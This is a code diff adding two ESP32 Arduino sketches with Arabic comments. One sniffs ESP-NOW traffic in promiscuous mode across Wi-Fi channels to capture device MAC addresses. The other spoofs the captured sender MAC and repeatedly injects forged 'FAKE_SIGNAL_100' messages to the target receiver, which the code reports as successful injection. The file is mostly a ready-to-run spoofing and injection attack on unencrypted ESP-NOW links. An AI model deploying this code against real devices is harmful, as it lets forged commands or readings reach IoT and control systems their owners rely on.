@@ -1,0 +1,93 @@
+//The sniffer code
+#include <esp_wifi.h>
+#include <WiFi.h>
+
+// دالة لمعالجة الحزم الملتقطة
+void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint8_t* frame = pkt->payload;
+
+    // نحن نبحث عن حزم Action Frames (التي يستخدمها ESP-NOW)
+    // تبدأ عادة بـ 0xD0 أو تحتوي على معرف Vendor لشركة Espressif
+    if (pkt->rx_ctrl.sig_len > 24) { 
+        Serial.print("Detected Connection -> ");
+        
+        // Receiver MAC (عنواو المستقبل - أول 6 بايتات بعد الـ Frame Control)
+        Serial.print("REC: ");
+        for (int i = 4; i < 10; i++) Serial.printf("%02X%s", frame[i], (i < 9) ? ":" : "");
+
+        // Sender MAC (عنوان المرسل - الـ 6 بايتات التالية)
+        Serial.print(" | SND: ");
+        for (int i = 10; i < 16; i++) Serial.printf("%02X%s", frame[i], (i < 15) ? ":" : "");
+        
+        Serial.println();
+    }
+}
+
+void setup() {
+    Serial.begin(115200);
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
+    
+    // ابدأ بالبحث في القناة 1 (يمكنك تغييرها للقناة التي يعمل عليها الهدف)
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    Serial.println("Sniffing for ESP-NOW pairs...");
+}
+
+void loop() {
+    static int ch = 1;
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    ch++;
+    if (ch > 13) ch = 1;
+    delay(500); // انتظر نصف ثانية في كل قناة
+}
+
+
+//The injector code
+#include <esp_now.h>
+#include <WiFi.h>
+#include <esp_wifi.h>
+
+// العناوين التي حصلت عليها من الـ Sniffer
+uint8_t sender_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; 
+uint8_t receiver_mac[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
+int target_channel = 1; // القناة التي وجدتها في الـ Sniffer
+
+void setup() {
+  Serial.begin(115200);
+  
+  // 1. إعداد الواي فاي أولاً
+  WiFi.mode(WIFI_STA);
+  
+  // 2. تغيير الماك أدرس قبل البدء بأي شيء
+  esp_wifi_set_mac(WIFI_IF_STA, sender_mac);
+  
+  // 3. ضبط القناة لتطابق قناة الهدف
+  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+
+  if (esp_now_init() != ESP_OK) return;
+
+  // 4. تعريف المستقبل
+  esp_now_peer_info_t peerInfo = {};
+  memcpy(peerInfo.peer_addr, receiver_mac, 6);
+  peerInfo.channel = target_channel; // استخدام القناة الصحيحة
+  peerInfo.encrypt = false;
+  
+  if (esp_now_add_peer(&peerInfo) != ESP_OK) {
+    Serial.println("Failed to add peer");
+    return;
+  }
+}
+
+void loop() {
+  const char* fakeData = "FAKE_SIGNAL_100";
+  esp_err_t result = esp_now_send(receiver_mac, (uint8_t *) fakeData, strlen(fakeData) + 1);
+  
+  if (result == ESP_OK) {
+    Serial.println("Fake signal injected successfully!");
+  } else {
+    Serial.println("Error sending the data");
+  }
+  delay(500); 
+}
